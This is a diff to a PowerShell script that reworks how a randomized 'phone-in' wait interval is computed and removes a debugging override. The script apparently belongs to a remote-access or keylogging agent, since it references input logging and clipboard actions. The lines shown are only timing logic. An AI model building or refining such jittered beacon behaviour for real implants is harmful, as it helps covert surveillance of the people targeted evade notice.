@@ -482,13 +482,20 @@ function Start-LoopMode
         try 
         {
             #Calculate the total waiting interval using the "phoneStatic" variable
-            If(($phoneStatic + 1) -gt $phoneInterval)
+            If(([int]$phoneStatic + 1) -gt [int]$phoneInterval)
             {
                 Write-Console -Message ("Phone static was too large relative to the phone interval. Setting defaults and continuing.")
                 $phoneInterval = 60 #Minutes
                 $phoneStatic = 10 #Minutes
             }
-            $waitTime = $phoneInterval + (Get-Random -Maximum $phoneStatic -Minimum (0 - $phoneStatic))
+            If([int]$phoneStatic -lt 1)
+            {
+                $waitTime = [int]$phoneInterval
+            }
+            Else
+            {
+                $waitTime = $phoneInterval + (Get-Random -Maximum $phoneStatic -Minimum (0 - $phoneStatic))
+            }
             Write-Console -Message ("Wait time was set to " + $waitTime + " minutes.")
         }
         catch 
@@ -497,14 +504,6 @@ function Start-LoopMode
             Write-Console -Message ("Exception thrown trying to calculate the wait time. Exiting. Error: " + $Error)
             Exit
         }
-        
-        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        $waitTime = 1
-        Write-Host "For debugging purposes the wait time has been set."
 
         Write-Console -Message ("About to enter waiting state with input logging set to " + $enableInputLogging + " and clipboard actions set to " + $enableClipboardActions + ". Next phone-in set to occur in " + $waitTime + " minutes.")
         
